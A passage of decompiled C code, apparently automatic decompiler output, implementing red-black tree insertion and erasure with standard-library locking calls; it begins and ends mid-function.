                            if (v46 == *(int32_t *)(*(int32_t *)(v41 + 4) + 4)) {
                                // break -> 0x408533
                                break;
                            }
                            v34 = v41;
                            v37 = v46;
                            // continue -> 0x408467
                            continue;
                        } else {
                            // 0x4084d7
                            if (*(int32_t *)(v44 + 20) == 0) {
                                // 0x4084dc
                                *v30 = 1;
                                *(int32_t *)(v32 + 20) = 1;
                                *(int32_t *)(*(int32_t *)(*(int32_t *)(g7 + 4) + 4) + 20) = v9;
                                g7 = *(int32_t *)(*(int32_t *)(g7 + 4) + 4);
                                // branch -> 0x408527
                                goto lab_0x408527_2;
                            } else {
                                int32_t * v51 = (int32_t *)v36; // 0x4084f8_0
                                int32_t v52 = v37; // 0x408506
                                if (v37 == *v51) {
                                    // 0x4084fc
                                    g7 = v36;
                                    g4 = v34;
                                    function_408d50(v51, v19);
                                    v52 = g7;
                                    // branch -> 0x408506
                                }
                                // 0x408506
                                *(int32_t *)(*(int32_t *)(v52 + 4) + 20) = 1;
                                *(int32_t *)(*(int32_t *)(*(int32_t *)(g7 + 4) + 4) + 20) = v9;
                                g4 = g5;
                                function_408cd0(*(int32_t *)(*(int32_t *)(g7 + 4) + 4), v19);
                                // branch -> 0x408527
                                goto lab_0x408527_2;
                            }
                            // 0x408527
                            v41 = g5;
                            v45 = *(int32_t *)(v41 + 4);
                            v46 = g7;
                            v47 = *(int32_t *)(v45 + 4);
                            if (v46 == v47) {
                                v42 = v41;
                                // break -> 0x408533
                                break;
                            }
                            v34 = v41;
                            v37 = v46;
                            // continue -> 0x408467
                            continue;
                        }
                        // 0x408527
                        v41 = g5;
                        v45 = *(int32_t *)(v41 + 4);
                        v46 = g7;
                        v47 = *(int32_t *)(v45 + 4);
                        if (v46 == v47) {
                            v42 = v41;
                            // break -> 0x408533
                            break;
                        }
                        v34 = v41;
                        v37 = v46;
                        // continue -> 0x408467
                        continue;
                    }
                    // 0x408533
                    v38 = *(int32_t *)(v42 + 4);
                    g6 = v38;
                    g5 = v19;
                    g7 = 0;
                    *(int32_t *)(*(int32_t *)(v38 + 4) + 20) = 1;
                    result3 = v3;
                    *(int32_t *)result3 = v31;
                    g2 = v7;
                    *(char *)(result3 + 4) = 1;
                    g3 = v6;
                    g4 = result;
                    return result3;
                }
                // 0x408533
                v38 = *(int32_t *)(v41 + 4);
                g6 = v38;
                g5 = v19;
                g7 = 0;
                *(int32_t *)(*(int32_t *)(v38 + 4) + 20) = 1;
                result3 = v3;
                *(int32_t *)result3 = v31;
                g2 = v7;
                *(char *)(result3 + 4) = 1;
                g3 = v6;
                g4 = result;
                return result3;
            }
        }
    }
    // 0x408433
    v32 = g1;
    *(int32_t *)g7 = g1;
    int32_t v53 = *(int32_t *)(g5 + 4); // 0x408439
    int32_t v54 = g7; // 0x40843c
    if (v54 == v53) {
        // 0x408440
        *(int32_t *)(v53 + 4) = v32;
        *(int32_t *)(*(int32_t *)(g5 + 4) + 8) = v32;
        // branch -> 0x408455
    } else {
        int32_t * v55 = (int32_t *)v53; // 0x40844b_0
        if (v54 == *v55) {
            // 0x40844f
            *v55 = g1;
            // branch -> 0x408455
        }
    }
    // 0x408455
    v31 = g1;
    // branch -> 0x408459
    // 0x408459
    v35 = g5;
    v33 = v31;
    g7 = v33;
    if (v33 == *(int32_t *)(*(int32_t *)(v35 + 4) + 4)) {
        // 0x408533
        v38 = *(int32_t *)(v35 + 4);
        g6 = v38;
        g5 = v19;
        g7 = 0;
        *(int32_t *)(*(int32_t *)(v38 + 4) + 20) = 1;
        result3 = v3;
        *(int32_t *)result3 = v31;
        g2 = v7;
        *(char *)(result3 + 4) = 1;
        g3 = v6;
        g4 = result;
        return result3;
    }
    v34 = v35;
    v37 = v33;
    while (true) {
        // 0x408467
        v36 = *(int32_t *)(v37 + 4);
        v9 = 0;
        v30 = (int32_t *)(v36 + 20);
        if (*v30 == 0) {
            goto lab_0x408475;
        }
        // 0x408533
        v38 = *(int32_t *)(v34 + 4);
        g6 = v38;
        g5 = v19;
        g7 = 0;
        *(int32_t *)(*(int32_t *)(v38 + 4) + 20) = 1;
        result3 = v3;
        *(int32_t *)result3 = v31;
        g2 = v7;
        *(char *)(result3 + 4) = 1;
        g3 = v6;
        g4 = result;
        return result3;
    }
}

// Address range: 0x4085d0 - 0x4089cf
int32_t function_4085d0(int32_t * a1, int32_t * a2, int32_t a3) {
    int32_t result = (int32_t)a1;
    int32_t v1 = (int32_t)a2;
    int32_t v2 = g4; // 0x4085d5
    int32_t v3 = g5; // bp-32
    g4 = &v1;
    function_408a10(g5);
    int32_t v4 = v1; // 0x4085e8
    int32_t v5 = *(int32_t *)v4; // 0x4085e8
    int32_t v6 = v5; // esi
    int32_t v7 = v4 + 8; // 0x4085f0
    int32_t v8 = v7; // ebx
    int32_t v9 = v7; // ebp
    int32_t v10 = *(int32_t *)v7; // 0x4085fd
    int32_t * v11; // 0x408661_0
    int32_t * v12; // 0x40866e_0
    int32_t * v13; // 0x408686_0
    int32_t * v14; // 0x4086a3_0
    int32_t * v15; // 0x4086b0_0
    int32_t * v16; // 0x4086c2_0
    int32_t * v17; // 0x4086f6_0
    int32_t v18; // eax
    int32_t v19; // ecx
    int32_t v20;
    int32_t v21; // 0x40863c
    int32_t v22; // 0x40868f
    int32_t v23; // 0x4086d7
    int32_t v24; // 0x4086e1
    int32_t v25; // 0x408715
    int32_t v26; // 0x408751113
    int32_t v27; // 0x40862d
    int32_t v28; // 0x40863a
    int32_t v29; // 0x4086c2
    int32_t v30; // 0x4086c6
    int32_t v31; // 0x4086d7
    int32_t v32; // 0x4086e3
    int32_t v33; // 0x4086ed
    int32_t v34; // 0x4086fb
    int32_t v35; // 0x40874f
    int32_t v36; // 0x408679
    int32_t v37; // 0x408696
    int32_t v38; // 0x4086bb
    int32_t v39; // 0x4086f3
    int32_t v40; // 0x40870c
    int32_t v41; // 0x408725
    int32_t v42; // 0x40865a
    int32_t v43; // 0x40866b
    int32_t v44; // 0x4086ad
    int32_t v45; // 0x4086f6
    int32_t v46; // 0x40870c
    int32_t v47; // 0x408717
    int32_t v48; // 0x40871e
    int32_t v49; // 0x408735
    int32_t v50; // 0x408738
    int32_t v51; // 0x40874c
    int32_t v52; // 0x40875d112
    int32_t v53; // 0x408661
    int32_t v54; // 0x4086a3
    if (v5 == g1178) {
        // 0x4085fd
        v6 = v10;
        v37 = v4;
        // branch -> 0x40861f
    } else {
        // 0x408601
        if (v10 != g1178) {
            int32_t v55 = *(int32_t *)v10; // 0x408607
            if (v55 != g1178) {
                int32_t v56 = *(int32_t *)v55; // 0x40860f
                while (v56 != g1178) {
                    // 0x40860d
                    v55 = v56;
                    v56 = *(int32_t *)v55;
                    // continue -> 0x40860d
                }
                // 0x408615
                v10 = v55;
                // branch -> 0x408615
            }
            int32_t v57 = v10 + 8; // 0x408615
            v6 = *(int32_t *)v57;
            v9 = v57;
            v37 = v10;
            // branch -> 0x40861f
        } else {
            v37 = v4;
        }
        // 0x40861f
        _qm__qm_0_Lockit_std__QAE_XZ();
        g6 = v37;
        v27 = v1;
        if (v37 == v27) {
            // 0x408696
            v19 = v2;
            *(int32_t *)(v6 + 4) = *(int32_t *)(v37 + 4);
            v14 = (int32_t *)(*(int32_t *)(v19 + 4) + 4);
            v54 = v1;
            if (*v14 == v54) {
                // 0x4086a8
                *v14 = v6;
                // branch -> 0x4086bb
            } else {
                // 0x4086ad
                v44 = *(int32_t *)(v54 + 4);
                v15 = (int32_t *)v44;
                if (*v15 == v54) {
                    // 0x4086b4
                    *v15 = v6;
                    // branch -> 0x4086bb
                } else {
                    // 0x4086b8
                    *(int32_t *)(v44 + 8) = v6;
                    // branch -> 0x4086bb
                }
                // 0x4086bb
                v38 = v19;
                v16 = (int32_t *)*(int32_t *)(v38 + 4);
                v29 = *v16;
                v39 = v38;
                if (v29 == v1) {
                    // 0x4086c6
                    v30 = g1178;
                    if (*(int32_t *)v8 == v30) {
                        // 0x4086d0
                        *v16 = *(int32_t *)(v29 + 4);
                        v39 = v19;
                        // branch -> 0x4086f3
                    } else {
                        // 0x4086d7
                        v23 = v6;
                        v31 = *(int32_t *)v23;
                        v33 = v23;
                        if (v31 != v30) {
                            // 0x4086df
                            v24 = v31;
                            v32 = *(int32_t *)v24;
                            // branch -> 0x4086e1
                            while (v32 != v30) {
                                // 0x4086e1
                                v24 = v32;
                                v32 = *(int32_t *)v24;
                                // continue -> 0x4086e1
                            }
                            // 0x4086e9
                            v33 = v24;
                            // branch -> 0x4086ed
                        }
                        // 0x4086ed
                        *v16 = v33;
                        v39 = v2;
                        // branch -> 0x4086f3
                    }
                    // 0x4086f3
                    v17 = (int32_t *)(*(int32_t *)(v39 + 4) + 8);
                    v45 = *v17;
                    if (v45 == v1) {
                        // 0x4086fb
                        v34 = g1178;
                        if (*(int32_t *)v45 == v34) {
                            // 0x408707
                            v48 = *(int32_t *)(v45 + 4);
                            // branch -> 0x40871e
                        } else {
                            // 0x40870c
                            v40 = v6;
                            v46 = *(int32_t *)(v40 + 8);
                            if (v46 != v34) {
                                v25 = v46;
                                v47 = *(int32_t *)(v25 + 8);
                                while (v47 != v34) {
                                    // 0x408715
                                    v25 = v47;
                                    v47 = *(int32_t *)(v25 + 8);
                                    // continue -> 0x408715
                                }
                                // 0x40871e
                                v48 = v25;
                                // branch -> 0x40871e
                            } else {
                                v48 = v40;
                            }
                        }
                        // 0x40871e
                        *v17 = v48;
                        // branch -> 0x408721
                    }
                    // 0x408721
                    v9 = v2;
                    v20 = v37;
                    // branch -> 0x408725
                    // 0x408725
                    v8 = 1;
                    if (*(int32_t *)(g6 + 20) == 1) {
                        // 0x408735
                        v49 = *(int32_t *)(v9 + 4);
                        g6 = v49;
                        v50 = v6;
                        if (v50 != *(int32_t *)(v49 + 4)) {
                            // 0x408741
                            v1 = 0;
                            if (*(int32_t *)(v50 + 20) == 1) {
                                v26 = v50;
                                v52 = 1;
                                while (true) {
                                    // 0x40874c
                                    v51 = *(int32_t *)(v26 + 4);
                                    v35 = *(int32_t *)v51;
                                    v18 = v35;
                                    int32_t * v58; // 0x4089b1_0
                                    int32_t v59;
                                    int32_t v60; // 0x40882d
                                    int32_t v61; // 0x408833
                                    if (v26 == v35) {
                                      lab_0x408755_9:;
                                        int32_t v62 = *(int32_t *)(v51 + 8); // 0x408755
                                        v18 = v62;
                                        int32_t * v63 = (int32_t *)(v62 + 20); // 0x408758_0
                                        int32_t v64 = v26; // 0x40889794
                                        int32_t v65 = v52; // 0x40884e
                                        int32_t * v66; // 0x4087aa_0
                                        int32_t * v67; // 0x4087b5_0
                                        int32_t * v68; // 0x408872_0
                                        int32_t * v69; // 0x40887f_0
                                        int32_t * v70; // 0x4088af_0
                                        int32_t * v71; // 0x4088cd_0
                                        int32_t * v72; // 0x4088df_0
                                        int32_t v73; // 0x408851
                                        int32_t v74; // 0x4088b7
                                        int32_t v75; // 0x4088b7
                                        int32_t v76; // 0x40885b
                                        int32_t v77; // 0x40886c
                                        int32_t v78; // 0x408891
                                        int32_t v79; // 0x408897
                                        int32_t v80; // 0x40889d
                                        int32_t v81; // 0x4088c7
                                        int32_t v82; // 0x40885b
                                        int32_t v83; // 0x408872
                                        int32_t v84; // 0x40887c
                                        int32_t v85; // 0x408884
                                        int32_t v86; // 0x408894
                                        int32_t v87; // 0x4088ac
                                        int32_t v88; // 0x4088af
                                        int32_t v89; // 0x4088ca
                                        int32_t v90; // 0x4088cd
                                        int32_t v91; // 0x4088dc
                                        if (*v63 == v1) {
                                            // 0x40875d
                                            *v63 = v52;
                                            *(int32_t *)(*(int32_t *)(v6 + 4) + 20) = v1;
                                            int32_t v92 = *(int32_t *)(v6 + 4); // 0x408766
                                            v18 = v92;
                                            int32_t * v93 = (int32_t *)(v92 + 8); // 0x408769_0
                                            int32_t v94 = *v93; // 0x408769
                                            v19 = v94;
                                            *v93 = *(int32_t *)v94;
                                            int32_t v95 = *(int32_t *)v19; // 0x408771
                                            if (v95 != g1178) {
                                                // 0x40877b
                                                *(int32_t *)(v95 + 4) = v18;
                                                // branch -> 0x40877e
                                            }
                                            // 0x40877e
                                            *(int32_t *)(v19 + 4) = *(int32_t *)(v18 + 4);
                                            int32_t v96 = v18; // 0x408787
                                            int32_t * v97 = (int32_t *)(*(int32_t *)(v9 + 4) + 4); // 0x408787_0
                                            int32_t v98; // 0x4087a4
                                            int32_t v99; // 0x4087a7
                                            if (v96 != *v97) {
                                                int32_t v100 = *(int32_t *)(v96 + 4); // 0x408791
                                                int32_t * v101 = (int32_t *)v100; // 0x408794_0
                                                if (v96 == *v101) {
                                                    // 0x408798
                                                    *v101 = v19;
                                                    // branch -> 0x40879f
                                                } else {
                                                    // 0x40879c
                                                    *(int32_t *)(v100 + 8) = v19;
                                                    // branch -> 0x40879f
                                                }
                                                // 0x40879f
                                                *(int32_t *)v19 = v18;
                                                *(int32_t *)(v18 + 4) = v19;
                                                v98 = v6;
                                                v99 = *(int32_t *)(*(int32_t *)(v98 + 4) + 8);
                                                v18 = v99;
                                                v64 = v98;
                                                v65 = v8;
                                                v62 = v99;
                                                // branch -> 0x4087aa
                                              lab_0x4087aa:
                                                // 0x4087aa
                                                v66 = (int32_t *)v62;
                                                v67 = (int32_t *)(v62 + 8);
                                                if (*(int32_t *)(*v66 + 20) == v65) {
                                                  lab_0x4087b5:;
                                                    int32_t v102 = *v67; // 0x4087b5
                                                    g6 = v102;
                                                    if (*(int32_t *)(v102 + 20) == v65) {
                                                        v60 = v62;
                                                      lab_0x40882d:
                                                        // 0x40882d
                                                        *(int32_t *)(v60 + 20) = v1;
                                                        v61 = *(int32_t *)(v6 + 4);
                                                        v6 = v61;
                                                        int32_t v103 = v61; // 0x40899a99
                                                        if (v61 != *(int32_t *)(*(int32_t *)(v9 + 4) + 4)) {
                                                          lab_0x40882d_2:;
                                                            int32_t v104 = v8;
                                                            if (*(int32_t *)(v61 + 20) != v104) {
                                                                // break -> 0x40899a
                                                                break;
                                                            }
                                                            v26 = v61;
                                                            v52 = v104;
                                                            // continue -> 0x40874c
                                                            continue;
                                                        }
                                                        // 0x40899a
                                                        // branch -> 0x40899a
                                                        // 0x40899a
                                                        *(int32_t *)(v103 + 20) = v8;
                                                        // branch -> 0x40899d
                                                        // 0x40899d
                                                        _qm__qm_1_Lockit_std__QAE_XZ();
                                                        g1 = v20;
                                                        function_4097fe((char *)v20);
                                                        v58 = (int32_t *)(v9 + 12);
                                                        v59 = v1;
                                                        g4 = v59;
                                                        *v58 = *v58 - 1;
                                                        g5 = v3;
                                                        *a1 = v59;
                                                        return result;
                                                    }
                                                }
                                                // 0x408844
                                                v80 = v62;
                                                v79 = v64;
                                                if (*(int32_t *)(*v67 + 20) == v65) {
                                                    // 0x40884c
                                                    *(int32_t *)(*v66 + 20) = v65;
                                                    v73 = v18;
                                                    v19 = *(int32_t *)v73;
                                                    *(int32_t *)(v73 + 20) = v1;
                                                    *(int32_t *)v18 = *(int32_t *)(v19 + 8);
                                                    v76 = v19;
                                                    v82 = *(int32_t *)(v76 + 8);
                                                    v77 = v76;
                                                    if (v82 != g1178) {
                                                        // 0x408866
                                                        *(int32_t *)(v82 + 4) = v18;
                                                        v77 = v19;
                                                        // branch -> 0x408869
                                                    }
                                                    // 0x408869
                                                    *(int32_t *)(v77 + 4) = *(int32_t *)(v18 + 4);
                                                    v83 = v18;
                                                    v68 = (int32_t *)(*(int32_t *)(v9 + 4) + 4);
                                                    if (v83 != *v68) {
                                                        // 0x40887c
                                                        v84 = *(int32_t *)(v83 + 4);
                                                        v69 = (int32_t *)(v84 + 8);
                                                        v85 = v19;
                                                        if (v83 == *v69) {
                                                            // 0x408884
                                                            *v69 = v85;
                                                            // branch -> 0x40888b
                                                        } else {
                                                            // 0x408889
                                                            *(int32_t *)v84 = v85;
                                                            // branch -> 0x40888b
                                                        }
                                                        // 0x40888b
                                                        *(int32_t *)(v19 + 8) = v18;
                                                        *(int32_t *)(v18 + 4) = v19;
                                                        v78 = v6;
                                                        v86 = *(int32_t *)(*(int32_t *)(v78 + 4) + 8);
                                                        // branch -> 0x408897
                                                        // 0x408897
                                                        *(int32_t *)(v86 + 20) = *(int32_t *)(*(int32_t *)(v78 + 4) + 20);
                                                        *(int32_t *)(*(int32_t *)(v6 + 4) + 20) = v8;
                                                        *(int32_t *)(*(int32_t *)(v86 + 8) + 20) = v8;
                                                        v87 = *(int32_t *)(v6 + 4);
                                                        v18 = v87;
                                                        v70 = (int32_t *)(v87 + 8);
                                                        v88 = *v70;
                                                        v19 = v88;
                                                        *v70 = *(int32_t *)v88;
                                                        v74 = v19;
                                                        v75 = *(int32_t *)v74;
                                                        v81 = v74;
                                                        if (v75 != g1178) {
                                                            // 0x4088c1
                                                            *(int32_t *)(v75 + 4) = v18;
                                                            v81 = v19;
                                                            // branch -> 0x4088c4
                                                        }
                                                        // 0x4088c4
                                                        *(int32_t *)(v81 + 4) = *(int32_t *)(v18 + 4);
                                                        v89 = *(int32_t *)(v9 + 4);
                                                        g6 = v89;
                                                        v90 = v18;
                                                        v71 = (int32_t *)(v89 + 4);
                                                        if (v90 == *v71) {
                                                            // 0x4088d2
                                                            *v71 = v19;
                                                            *(int32_t *)v19 = v18;
                                                            // branch -> 0x408997
                                                            // 0x408997
                                                            *(int32_t *)(v18 + 4) = v19;
                                                            // branch -> 0x40899a
                                                            // 0x40899a
                                                            *(int32_t *)(v6 + 20) = v8;
                                                            // branch -> 0x40899d
                                                            // 0x40899d
                                                            _qm__qm_1_Lockit_std__QAE_XZ();
                                                            g1 = v20;
                                                            function_4097fe((char *)v20);
                                                            v58 = (int32_t *)(v9 + 12);
                                                            v59 = v1;
                                                            g4 = v59;
                                                            *v58 = *v58 - 1;
                                                            g5 = v3;
                                                            *a1 = v59;
                                                            return result;
                                                        }
                                                        // 0x4088dc
                                                        v91 = *(int32_t *)(v90 + 4);
                                                        g6 = v91;
                                                        v72 = (int32_t *)v91;
                                                        if (v90 == *v72) {
                                                            // 0x4088e3
                                                            *v72 = v19;
                                                            *(int32_t *)v19 = v18;
                                                            // branch -> 0x408997
                                                            // 0x408997
                                                            *(int32_t *)(v18 + 4) = v19;
                                                            // branch -> 0x40899a
                                                            // 0x40899a
                                                            *(int32_t *)(v6 + 20) = v8;
                                                            // branch -> 0x40899d
                                                            // 0x40899d
                                                            _qm__qm_1_Lockit_std__QAE_XZ();
                                                            g1 = v20;
                                                            function_4097fe((char *)v20);
                                                            v58 = (int32_t *)(v9 + 12);
                                                            v59 = v1;
                                                            g4 = v59;
                                                            *v58 = *v58 - 1;
                                                            g5 = v3;
                                                            *a1 = v59;
                                                            return result;
                                                        }
                                                        // 0x4088ec
                                                        *(int32_t *)(v91 + 8) = v19;
                                                        *(int32_t *)v19 = v18;
                                                        // branch -> 0x408997
                                                        // 0x408997
                                                        *(int32_t *)(v18 + 4) = v19;
                                                        // branch -> 0x40899a
                                                        // 0x40899a
                                                        *(int32_t *)(v6 + 20) = v8;
                                                        // branch -> 0x40899d
                                                        // 0x40899d
                                                        _qm__qm_1_Lockit_std__QAE_XZ();
                                                        g1 = v20;
                                                        function_4097fe((char *)v20);
                                                        v58 = (int32_t *)(v9 + 12);
                                                        v59 = v1;
                                                        g4 = v59;
                                                        *v58 = *v58 - 1;
                                                        g5 = v3;
                                                        *a1 = v59;
                                                        return result;
                                                    }
                                                    // 0x408877
                                                    *v68 = v19;
                                                    // branch -> 0x40888b
                                                    // 0x40888b
                                                    *(int32_t *)(v19 + 8) = v18;
                                                    *(int32_t *)(v18 + 4) = v19;
                                                    v78 = v6;
                                                    v86 = *(int32_t *)(*(int32_t *)(v78 + 4) + 8);
                                                    v18 = v86;
                                                    v80 = v86;
                                                    v79 = v78;
                                                    // branch -> 0x408897
                                                }
                                                // 0x408897
                                                *(int32_t *)(v80 + 20) = *(int32_t *)(*(int32_t *)(v79 + 4) + 20);
                                                *(int32_t *)(*(int32_t *)(v6 + 4) + 20) = v8;
                                                *(int32_t *)(*(int32_t *)(v18 + 8) + 20) = v8;
                                                v87 = *(int32_t *)(v6 + 4);
                                                v18 = v87;
                                                v70 = (int32_t *)(v87 + 8);
                                                v88 = *v70;
                                                v19 = v88;
                                                *v70 = *(int32_t *)v88;
                                                v74 = v19;
                                                v75 = *(int32_t *)v74;
                                                v81 = v74;
                                                if (v75 != g1178) {
                                                    // 0x4088c1
                                                    *(int32_t *)(v75 + 4) = v18;
                                                    v81 = v19;
                                                    // branch -> 0x4088c4
                                                }
                                                // 0x4088c4
                                                *(int32_t *)(v81 + 4) = *(int32_t *)(v18 + 4);
                                                v89 = *(int32_t *)(v9 + 4);
                                                g6 = v89;
                                                v90 = v18;
                                                v71 = (int32_t *)(v89 + 4);
                                                if (v90 == *v71) {
                                                    // 0x4088d2
                                                    *v71 = v19;
                                                    *(int32_t *)v19 = v18;
                                                    // branch -> 0x408997
                                                    // 0x408997
                                                    *(int32_t *)(v18 + 4) = v19;
                                                    // branch -> 0x40899a
                                                    // 0x40899a
                                                    *(int32_t *)(v6 + 20) = v8;
                                                    // branch -> 0x40899d
                                                    // 0x40899d
                                                    _qm__qm_1_Lockit_std__QAE_XZ();
                                                    g1 = v20;
                                                    function_4097fe((char *)v20);
                                                    v58 = (int32_t *)(v9 + 12);
                                                    v59 = v1;
                                                    g4 = v59;
                                                    *v58 = *v58 - 1;
                                                    g5 = v3;
                                                    *a1 = v59;
                                                    return result;
                                                }
                                                // 0x4088dc
                                                v91 = *(int32_t *)(v90 + 4);
                                                g6 = v91;
                                                v72 = (int32_t *)v91;
                                                if (v90 == *v72) {
                                                    // 0x4088e3
                                                    *v72 = v19;
                                                    *(int32_t *)v19 = v18;
                                                    // branch -> 0x408997
                                                    // 0x408997
                                                    *(int32_t *)(v18 + 4) = v19;
                                                    // branch -> 0x40899a
                                                    // 0x40899a
                                                    *(int32_t *)(v6 + 20) = v8;
                                                    // branch -> 0x40899d
                                                    // 0x40899d
                                                    _qm__qm_1_Lockit_std__QAE_XZ();
                                                    g1 = v20;
                                                    function_4097fe((char *)v20);
                                                    v58 = (int32_t *)(v9 + 12);
                                                    v59 = v1;
                                                    g4 = v59;
                                                    *v58 = *v58 - 1;
                                                    g5 = v3;
                                                    *a1 = v59;
                                                    return result;
                                                }
                                                // 0x4088ec
                                                *(int32_t *)(v91 + 8) = v19;
                                                *(int32_t *)v19 = v18;
                                                // branch -> 0x408997
                                                // 0x408997
                                                *(int32_t *)(v18 + 4) = v19;
                                                // branch -> 0x40899a
                                                // 0x40899a
                                                *(int32_t *)(v6 + 20) = v8;
                                                // branch -> 0x40899d
                                                // 0x40899d
                                                _qm__qm_1_Lockit_std__QAE_XZ();
                                                g1 = v20;
                                                function_4097fe((char *)v20);
                                                v58 = (int32_t *)(v9 + 12);
                                                v59 = v1;
                                                g4 = v59;
                                                *v58 = *v58 - 1;
                                                g5 = v3;
                                                *a1 = v59;
                                                return result;
                                            }
                                            // 0x40878c
                                            *v97 = v19;
                                            // branch -> 0x40879f
                                            // 0x40879f
                                            *(int32_t *)v19 = v18;
                                            *(int32_t *)(v18 + 4) = v19;
                                            v98 = v6;
                                            v99 = *(int32_t *)(*(int32_t *)(v98 + 4) + 8);
                                            v18 = v99;
                                            v64 = v98;
                                            v65 = v8;
                                            v62 = v99;
                                            // branch -> 0x4087aa
                                            goto lab_0x4087aa;
                                        }
                                        // 0x4087aa
                                        v66 = (int32_t *)v62;
                                        v67 = (int32_t *)(v62 + 8);
                                        if (*(int32_t *)(*v66 + 20) == v65) {
                                            goto lab_0x4087b5;
                                        }
                                        // 0x408844
                                        v80 = v62;
                                        v79 = v64;
                                        if (*(int32_t *)(*v67 + 20) == v65) {
                                            // 0x40884c
                                            *(int32_t *)(*v66 + 20) = v65;
                                            v73 = v18;
                                            v19 = *(int32_t *)v73;
                                            *(int32_t *)(v73 + 20) = v1;
                                            *(int32_t *)v18 = *(int32_t *)(v19 + 8);
                                            v76 = v19;
                                            v82 = *(int32_t *)(v76 + 8);
                                            v77 = v76;
                                            if (v82 != g1178) {
                                                // 0x408866
                                                *(int32_t *)(v82 + 4) = v18;
                                                v77 = v19;
                                                // branch -> 0x408869
                                            }
                                            // 0x408869
                                            *(int32_t *)(v77 + 4) = *(int32_t *)(v18 + 4);
                                            v83 = v18;
                                            v68 = (int32_t *)(*(int32_t *)(v9 + 4) + 4);
                                            if (v83 != *v68) {
                                                // 0x40887c
                                                v84 = *(int32_t *)(v83 + 4);
                                                v69 = (int32_t *)(v84 + 8);
                                                v85 = v19;
                                                if (v83 == *v69) {
                                                    // 0x408884
                                                    *v69 = v85;
                                                    // branch -> 0x40888b
                                                } else {
                                                    // 0x408889
                                                    *(int32_t *)v84 = v85;
                                                    // branch -> 0x40888b
                                                }
                                                // 0x40888b
                                                *(int32_t *)(v19 + 8) = v18;
                                                *(int32_t *)(v18 + 4) = v19;
                                                v78 = v6;
                                                v86 = *(int32_t *)(*(int32_t *)(v78 + 4) + 8);
                                                // branch -> 0x408897
                                                // 0x408897
                                                *(int32_t *)(v86 + 20) = *(int32_t *)(*(int32_t *)(v78 + 4) + 20);
                                                *(int32_t *)(*(int32_t *)(v6 + 4) + 20) = v8;
                                                *(int32_t *)(*(int32_t *)(v86 + 8) + 20) = v8;
                                                v87 = *(int32_t *)(v6 + 4);
                                                v18 = v87;
                                                v70 = (int32_t *)(v87 + 8);
                                                v88 = *v70;
                                                v19 = v88;
                                                *v70 = *(int32_t *)v88;
                                                v74 = v19;
                                                v75 = *(int32_t *)v74;
                                                v81 = v74;
                                                if (v75 != g1178) {
                                                    // 0x4088c1
                                                    *(int32_t *)(v75 + 4) = v18;
                                                    v81 = v19;
                                                    // branch -> 0x4088c4
                                                }
                                                // 0x4088c4
                                                *(int32_t *)(v81 + 4) = *(int32_t *)(v18 + 4);
                                                v89 = *(int32_t *)(v9 + 4);
                                                g6 = v89;
                                                v90 = v18;
                                                v71 = (int32_t *)(v89 + 4);
                                                if (v90 == *v71) {
                                                    // 0x4088d2
                                                    *v71 = v19;
                                                    *(int32_t *)v19 = v18;
                                                    // branch -> 0x408997
                                                    // 0x408997
                                                    *(int32_t *)(v18 + 4) = v19;
                                                    // branch -> 0x40899a
                                                    // 0x40899a
                                                    *(int32_t *)(v6 + 20) = v8;
                                                    // branch -> 0x40899d
                                                    // 0x40899d
                                                    _qm__qm_1_Lockit_std__QAE_XZ();
                                                    g1 = v20;
                                                    function_4097fe((char *)v20);
                                                    v58 = (int32_t *)(v9 + 12);
                                                    v59 = v1;
                                                    g4 = v59;
                                                    *v58 = *v58 - 1;
                                                    g5 = v3;
                                                    *a1 = v59;
                                                    return result;
                                                }
                                                // 0x4088dc
                                                v91 = *(int32_t *)(v90 + 4);
                                                g6 = v91;
                                                v72 = (int32_t *)v91;
                                                if (v90 == *v72) {
                                                    // 0x4088e3
                                                    *v72 = v19;
                                                    *(int32_t *)v19 = v18;
                                                    // branch -> 0x408997
                                                    // 0x408997
                                                    *(int32_t *)(v18 + 4) = v19;
                                                    // branch -> 0x40899a
                                                    // 0x40899a
                                                    *(int32_t *)(v6 + 20) = v8;
                                                    // branch -> 0x40899d
                                                    // 0x40899d
                                                    _qm__qm_1_Lockit_std__QAE_XZ();
                                                    g1 = v20;
                                                    function_4097fe((char *)v20);
                                                    v58 = (int32_t *)(v9 + 12);
                                                    v59 = v1;
                                                    g4 = v59;
                                                    *v58 = *v58 - 1;
                                                    g5 = v3;
                                                    *a1 = v59;
                                                    return result;
                                                }
                                                // 0x4088ec
                                                *(int32_t *)(v91 + 8) = v19;
                                                *(int32_t *)v19 = v18;
                                                // branch -> 0x408997
                                                // 0x408997
                                                *(int32_t *)(v18 + 4) = v19;
                                                // branch -> 0x40899a
                                                // 0x40899a
                                                *(int32_t *)(v6 + 20) = v8;
                                                // branch -> 0x40899d
                                                // 0x40899d
                                                _qm__qm_1_Lockit_std__QAE_XZ();
                                                g1 = v20;
                                                function_4097fe((char *)v20);
                                                v58 = (int32_t *)(v9 + 12);
                                                v59 = v1;
                                                g4 = v59;
                                                *v58 = *v58 - 1;
                                                g5 = v3;
                                                *a1 = v59;
                                                return result;
                                            }
                                            // 0x408877
                                            *v68 = v19;
                                            // branch -> 0x40888b
                                            // 0x40888b
                                            *(int32_t *)(v19 + 8) = v18;
                                            *(int32_t *)(v18 + 4) = v19;
                                            v78 = v6;
                                            v86 = *(int32_t *)(*(int32_t *)(v78 + 4) + 8);
                                            v18 = v86;
                                            v80 = v86;
                                            v79 = v78;
                                            // branch -> 0x408897
                                        }
                                        // 0x408897
                                        *(int32_t *)(v80 + 20) = *(int32_t *)(*(int32_t *)(v79 + 4) + 20);
                                        *(int32_t *)(*(int32_t *)(v6 + 4) + 20) = v8;
                                        *(int32_t *)(*(int32_t *)(v18 + 8) + 20) = v8;
                                        v87 = *(int32_t *)(v6 + 4);
                                        v18 = v87;
                                        v70 = (int32_t *)(v87 + 8);
                                        v88 = *v70;
                                        v19 = v88;
                                        *v70 = *(int32_t *)v88;
                                        v74 = v19;
                                        v75 = *(int32_t *)v74;
                                        v81 = v74;
                                        if (v75 != g1178) {
                                            // 0x4088c1
                                            *(int32_t *)(v75 + 4) = v18;
                                            v81 = v19;
                                            // branch -> 0x4088c4
                                        }
                                        // 0x4088c4
                                        *(int32_t *)(v81 + 4) = *(int32_t *)(v18 + 4);
                                        v89 = *(int32_t *)(v9 + 4);
                                        g6 = v89;
                                        v90 = v18;
                                        v71 = (int32_t *)(v89 + 4);
                                        if (v90 == *v71) {
                                            // 0x4088d2
                                            *v71 = v19;
                                            *(int32_t *)v19 = v18;
                                            // branch -> 0x408997
                                            // 0x408997
                                            *(int32_t *)(v18 + 4) = v19;
                                            // branch -> 0x40899a
                                            // 0x40899a
